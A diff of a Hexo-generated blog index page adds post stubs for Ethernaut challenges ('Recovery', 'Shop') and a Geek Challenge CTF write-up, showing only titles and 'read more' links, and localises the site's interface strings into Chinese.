+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/Recovery/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="wordmaya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AUV wordmaya">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/03/24/Recovery/" class="post-title-link" itemprop="url">Recovery</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:47:17" itemprop="dateModified" datetime="2026-03-27T11:47:17+08:00">2026-03-27</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h1><p>from Ethernaut</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/Recovery/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/Shop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="wordmaya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AUV wordmaya">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/03/24/Shop/" class="post-title-link" itemprop="url">Shop</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:47:11" itemprop="dateModified" datetime="2026-03-27T11:47:11+08:00">2026-03-27</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h1><p>from Ethernaut</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/Shop/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/Points/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="wordmaya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AUV wordmaya">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/03/24/Points/" class="post-title-link" itemprop="url">25极客大挑战</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:48:27" itemprop="dateModified" datetime="2026-03-27T11:48:27+08:00">2026-03-27</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>from 26极客大挑战</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/Points/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -524,7 +1060,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -568,10 +1104,10 @@
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc">
-          Table of Contents
+          文章目录
         </li>
         <li class="sidebar-nav-overview">
-          Overview
+          站点概览
         </li>
       </ul>
 
@@ -592,15 +1128,15 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
-          <span class="site-state-item-name">posts</span>
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">tags</span></a>
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -653,18 +1189,18 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">154k</span>
+    <span title="站点总字数">196k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">2:20</span>
+    <span title="站点阅读时长">2:58</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共26k字</span>
+  <span class="post-count">博客全站共35k字</span>
 </div>
 
 
@@ -704,7 +1240,7 @@ $(document).ready(function() {
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
-      <span class="site-uv" title="Total Visitors">
+      <span class="site-uv" title="总访客量">
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
@@ -713,7 +1249,7 @@ $(document).ready(function() {
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
-      <span class="site-pv" title="Total Views">
+      <span class="site-pv" title="总访问量">
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
@@ -734,6 +1270,8 @@ $(document).ready(function() {
   
   <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
 
@@ -765,6 +1303,8 @@ $(document).ready(function() {
 
 
 
+
+  
 
   
 
